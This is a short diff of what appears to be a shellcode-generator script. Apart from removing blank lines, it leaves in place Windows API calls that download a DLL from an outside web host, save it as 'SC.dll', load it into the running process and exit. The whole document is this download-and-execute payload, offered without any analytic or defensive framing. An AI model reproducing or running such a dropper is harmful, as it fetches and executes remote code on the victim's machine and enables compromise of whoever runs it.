@@ -1,13 +1,7 @@
 function URLDownloadToFileA("urlmon.dll");
-
 function LoadLibraryA("kernel32.dll");
-
 function ExitProcess("kernel32.dll");
 
-
-
 URLDownloadToFileA(0,"https://rstforums.com/fisiere/DLLExample.dll","SC.dll",0,0);
-
 LoadLibraryA("SC.dll");
-
 ExitProcess(0);
